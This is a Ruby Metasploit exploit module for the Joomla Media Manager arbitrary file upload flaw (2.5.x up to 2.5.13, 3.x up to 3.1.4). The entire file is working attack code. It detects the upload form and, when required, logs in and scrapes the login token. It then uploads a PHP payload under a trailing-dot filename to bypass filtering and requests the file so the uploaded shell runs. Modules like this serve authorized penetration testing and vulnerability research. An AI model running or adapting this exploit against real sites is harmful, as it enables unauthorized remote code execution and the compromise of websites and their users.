# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Joomla Media Manager File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Joomla 2.5.x up to 2.5.13, as well as
        3.x up to 3.1.4 versions. The vulnerability exists in the Media Manager component,
        which comes by default in Joomla, allowing arbitrary file uploads, and results in
        arbitrary code execution. The module has been tested successfully on Joomla 2.5.13
        and 3.1.4 on Ubuntu 10.04. Note: If public access isn&#039;t allowed to the Media
        Manager, you will need to supply a valid username and password (Editor role or
        higher) in order to work properly.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jens Hinrichsen&#039;, # Vulnerability discovery according to the OSVDB
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;95933&#039; ],
          [ &#039;URL&#039;, &#039;http://developer.joomla.org/security/news/563-20130801-core-unauthorised-uploads&#039; ],
          [ &#039;URL&#039;, &#039;http://www.cso.com.au/article/523528/joomla_patches_file_manager_vulnerability_responsible_hijacked_websites/&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/joomla/joomla-cms/commit/fa5645208eefd70f521cd2e4d53d5378622133d8&#039; ],
          [ &#039;URL&#039;, &#039;http://niiconsulting.com/checkmate/2013/08/critical-joomla-file-upload-vulnerability/&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it&#039;s unlimited
          &#039;Space&#039;       => 262144, # 256k
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Joomla 2.5.x <=2.5.13&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 01 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Joomla&#039;, &#039;/joomla&#039;]),
          OptString.new(&#039;USERNAME&#039;, [false, &#039;User to login with&#039;, &#039;&#039;]),
          OptString.new(&#039;PASSWORD&#039;, [false, &#039;Password to login with&#039;, &#039;&#039;]),
        ], self.class)

  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def check
    res = get_upload_form

    if res and res.code == 200
      if res.body =~ /You are not authorised to view this resource/
        print_status("#{peer} - Joomla Media Manager Found but authentication required")
        return Exploit::CheckCode::Detected
      elsif res.body =~ /<form action="(.*)" id="uploadForm"/
        print_status("#{peer} - Joomla Media Manager Found and authentication isn&#039;t required")
        return Exploit::CheckCode::Detected
      end
    end

    return Exploit::CheckCode::Safe
  end

  def upload(upload_uri)
    begin
      u = URI(upload_uri)
    rescue ::URI::InvalidURIError
      fail_with(Exploit::Failure::Unknown, "Unable to get the upload_uri correctly")
    end

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, "application/x-php", nil, "form-data; name=\"Filedata[]\"; filename=\"#{@upload_name}.\"")
    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => "#{u.path}?#{u.query}",
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;cookie&#039;   => @cookies,
      &#039;vars_get&#039; => {
        &#039;asset&#039;  => &#039;com_content&#039;,
        &#039;author&#039; => &#039;&#039;,
        &#039;format&#039; => &#039;&#039;,
        &#039;view&#039;   => &#039;images&#039;,
        &#039;folder&#039; => &#039;&#039;
      },
      &#039;data&#039;     => post_data
    })

    return res

  end

  def get_upload_form
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "index.php"),
      &#039;cookie&#039;   => @cookies,
      &#039;encode_params&#039; => false,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_media&#039;,
        &#039;view&#039;   => &#039;images&#039;,
        &#039;tmpl&#039;   => &#039;component&#039;,
        &#039;e_name&#039; => &#039;jform_articletext&#039;,
        &#039;asset&#039;  =>  &#039;com_content&#039;,
        &#039;author&#039; => &#039;&#039;
      }
    })

    return res
  end

  def get_login_form

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "index.php", "component", "users", "/"),
      &#039;cookie&#039;   => @cookies,
      &#039;vars_get&#039; => {
        &#039;view&#039; => &#039;login&#039;
      }
    })

    return res

  end

  def login
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "index.php", "component", "users", "/"),
      &#039;cookie&#039;   => @cookies,
      &#039;vars_get&#039; => {
        &#039;task&#039; => &#039;user.login&#039;
      },
      &#039;vars_post&#039; => {
        &#039;username&#039; => @username,
        &#039;password&#039; => @password
        }.merge(@login_options)
      })

    return res
  end

  def parse_login_options(html)
    html.scan(/<input type="hidden" name="(.*)" value="(.*)" \/>/) {|option|
      @login_options[option[0]] = option[1] if option[1] == "1" # Searching for the Token Parameter, which always has value "1"
    }
  end

  def exploit
    @login_options = {}
    @cookies = ""
    @upload_name = "#{rand_text_alpha(rand(5) + 3)}.php"
    @username = datastore[&#039;USERNAME&#039;]
    @password = datastore[&#039;PASSWORD&#039;]

    print_status("#{peer} - Checking Access to Media Component...")
    res = get_upload_form

    if res and res.code == 200 and res.headers[&#039;Set-Cookie&#039;] and res.body =~ /You are not authorised to view this resource/
      print_status("#{peer} - Authentication required... Proceeding...")

      if @username.empty? or @password.empty?
        fail_with(Exploit::Failure::BadConfig, "#{peer} - Authentication is required to access the Media Manager Component, please provide credentials")
      end
      @cookies = res.get_cookies.sub(/;$/, "")

      print_status("#{peer} - Accessing the Login Form...")
      res = get_login_form
      if res.nil? or res.code != 200 or res.body !~ /login/
        fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to Access the Login Form")
      end
      parse_login_options(res.body)

      res = login
      if not res or res.code != 303
        fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to Authenticate")
      end
    elsif res and res.code ==200 and res.headers[&#039;Set-Cookie&#039;] and res.body =~ /<form action="(.*)" id="uploadForm"/
      print_status("#{peer} - Authentication isn&#039;t required.... Proceeding...")
      @cookies = res.get_cookies.sub(/;$/, "")
    else
      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Failed to Access the Media Manager Component")
    end

    print_status("#{peer} - Accessing the Upload Form...")
    res = get_upload_form

    if res and res.code == 200 and res.body =~ /<form action="(.*)" id="uploadForm"/
      upload_uri = Rex::Text.html_decode($1)
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to Access the Upload Form")
    end

    print_status("#{peer} - Uploading shell...")

    res = upload(upload_uri)

    if res.nil? or res.code != 200
      fail_with(Exploit::Failure::Unknown, "#{peer} - Upload failed")
    end

    register_files_for_cleanup("#{@upload_name}.")
    print_status("#{peer} - Executing shell...")
    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "images", @upload_name),
    })

  end

end

